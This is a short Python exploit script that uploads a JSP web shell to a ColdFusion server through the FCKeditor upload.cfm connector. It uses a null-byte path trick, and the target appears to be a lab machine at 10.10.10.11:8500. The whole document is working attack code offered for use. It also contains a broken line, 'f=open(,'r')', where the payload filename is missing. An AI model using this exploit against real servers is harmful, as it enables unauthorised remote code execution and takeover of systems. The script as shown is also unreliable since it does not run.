## Notes:
##    - Make sure the new file doesn't already exist or else the server will just lock up
##    - Make sure you have the payload in the current directory
import socket

addr='10.10.10.11'
port=8500
nl='\n'
rshell="cmd.jsp"  #Change me!

f=open(,'r')
data=f.read()
data=data.replace('\n','\r\n')
payload_name=rshell

body=f'''-----647913258\r
Content-Disposition: form-data; name="newfile"; filename="miked.txt"\r
Content-Type: application/x-java-archive\r\n\r
{data}\r
-----647913258--'''
print(f"""[|X:main]: Lengths:
    Data: {len(data)}
    Body: {len(body)}""")

payload=f'''POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{payload_name}%00 HTTP/1.1\r
Host: 10.10.10.11:8500\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/62.0.3202.9 Safari/537.36\r
Content-Type: multipart/form-data; boundary=---647913258\r
Content-Length: {len(body)}\r\n\r\n{body}'''

print(f"[|X:main]: Payload: {payload}")
print(f"[|X:main]: Sending request...")

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((addr,port))
sock.send(payload.encode())

print(f"[|X:main]: Reply:")
print(sock.recv(1023).decode().replace('\n','\n    '))
